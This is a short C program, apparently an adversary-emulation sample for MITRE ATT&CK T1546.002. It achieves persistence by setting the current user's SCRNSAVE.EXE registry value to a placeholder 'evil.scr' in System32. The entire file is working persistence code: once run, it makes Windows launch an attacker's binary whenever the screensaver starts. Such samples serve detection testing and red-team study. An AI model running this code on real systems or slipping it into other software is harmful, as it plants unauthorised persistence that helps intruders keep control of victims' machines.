/*
 * T1546.002 — Event Triggered: Screensaver. Persistence via Control Panel\Desktop SCRNSAVE.EXE.
 */
#include <windows.h>
#include <string.h>

int main(void) {
    HKEY hKey = NULL;
    const char *path = "Control Panel\\Desktop";
    if (RegOpenKeyExA(HKEY_CURRENT_USER, path, 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS)
        return 1;
    const char *value = "SCRNSAVE.EXE";
    const char *data = "C:\\Windows\\System32\\evil.scr";
    RegSetValueExA(hKey, value, 0, REG_SZ, (const BYTE *)data, (DWORD)strlen(data) + 1);
    RegCloseKey(hKey);
    return 0;
}
